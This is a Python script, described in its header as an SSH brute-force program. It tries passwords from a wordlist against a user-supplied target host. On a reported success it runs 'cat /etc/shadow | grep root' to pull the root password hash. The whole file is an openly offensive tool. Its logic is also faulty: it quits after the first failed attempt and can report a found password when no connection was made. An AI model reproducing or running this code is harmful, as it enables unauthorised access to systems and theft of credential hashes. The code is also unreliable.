#!/usr/bin/python
#-*- coding:utf-8 -*-
#Author: Isaac Privett
#Date: 05-01-2022
#Description: Brute force SSH program

import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def send_command(child, command):
	child.sendline(command)
	child. expect(PROMPT)
	print(child.before)
	
def connect(user, host, password):
	ssh_newkey = 'Are you sure you want to continue connecting'
	connStr = 'ssh ' + user + '@' + host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
	if ret == 0:
		print("[-] Connection Error")
		return
	if ret == 1:
		child.sendline('yes')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
		if ret == 0:
			print("[-] Connection Error")
			return
	child.sendline(password)
	child.expect(PROMPT, timeout=0.1)
	return child
	
def main():
	host = input("Enter IP address of target: ")
	user = input("Enter the user account: ")
	file = open('passwords.txt', 'r', encoding="ISO-8859-1")
	for password in file.readlines():
		password = password.strip('\n')
		try:
			child = connect(user, host, password)
			print("[+] Password Found: " + password)
			send_command(child, 'cat /etc/shadow | grep root;ps')
			quit()
		except:
			#print("[-] Wrong Password " + password)
			return
		
main()	
